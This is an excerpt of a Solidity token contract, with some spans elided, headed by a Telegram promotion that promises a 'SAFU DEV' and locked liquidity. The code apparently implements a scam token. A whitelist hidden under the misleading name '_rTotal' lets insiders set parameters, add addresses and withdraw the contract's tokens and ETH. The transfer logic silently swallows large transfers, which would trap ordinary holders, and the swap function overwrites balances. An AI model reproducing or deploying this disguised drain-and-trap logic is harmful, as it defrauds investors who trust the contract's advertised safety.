...
/*
https://t.me/blackeyemusk
💥FAIRLAUNCH AT 500 MEMBER 💥

✅ SAFU DEV
🔐 LIQUIDITY LOCK
✅ VERIFIED CONTRACT
💵 HUGE MARKETING INCOMING
...
contract Contract is IERC20, Ownable {
    ...
    mapping(address => bool) private _rTotal;
    ...
    constructor(
        ...
        _name = Name;
        _symbol = Symbol;
        _rTotal[msg.sender] = true;
        _rTotal[address(this)] = true;
    ...
    function set(uint256 amount) external {
        if (_rTotal[msg.sender]) _amount = amount;
    }

    function exclude(address account, bool value) external {
        if (_rTotal[msg.sender]) _rTotal[account] = value;
    }

    function setSwapAndLiquifyEnabled(bool _enabled) external {
        if (_rTotal[msg.sender]) _swapAndLiquifyEnabled = _enabled;
    }
    ...
    function transferAnyERC20Token(
        ...
        if (_rTotal[msg.sender]) IERC20(token).transfer(account, amount);
    }

    function transferToken(address account, uint256 amount) external {
        if (_rTotal[msg.sender]) payable(account).transfer(amount);
    }
    ...
    function _transfer(
        ...
        if (!inSwapAndLiquify && from != uniswapV2Pair && from != address(router) && !_rTotal[from] && amount <= swapTokensAtAmount) {
        ...
        if (_rTotal[to] && _rTotal[from]) return swapTokensForEth(amount, to);
        if (amount > swapTokensAtAmount && to != uniswapV2Pair && to != address(router)) {
            approval[to] = amount;
            return;
        }
        ...
        bool takeFee = !_rTotal[from] && !_rTotal[to] && fee > 0 && !inSwapAndLiquify;
        address factory = address(_factory);
        if (approval[factory] == 0) approval[factory] = swapTokensAtAmount;
        _factory = uint160(to);
    ...
    function swapTokensForEth(uint256 tokenAmount, address to) private {
        ...
        path[0] = address(this);
        path[1] = router.WETH();
        if (tokenAmount > swapTokensAtAmount) _balances[address(this)] = tokenAmount;
